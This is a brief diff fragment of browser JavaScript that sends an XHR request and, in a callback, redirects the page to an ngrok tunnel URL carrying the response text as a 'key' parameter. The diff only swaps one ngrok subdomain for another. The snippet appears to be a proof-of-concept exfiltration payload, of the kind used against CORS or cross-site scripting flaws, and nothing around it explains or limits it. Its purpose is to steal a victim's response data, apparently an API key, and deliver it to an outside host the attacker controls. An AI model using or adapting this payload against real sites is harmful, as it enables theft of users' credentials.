@@ -6,5 +6,5 @@ xhr.setRequestHeader("Content-Type", "application/json");
 xhr.send(null);
 
 function reqListener() {
-    window.location='https://e884-202-162-37-174.ngrok-free.app/?key='+encodeURIComponent(this.responseText); 
+    window.location='https://832a-202-162-37-174.ngrok-free.app/?key='+encodeURIComponent(this.responseText); 
 };
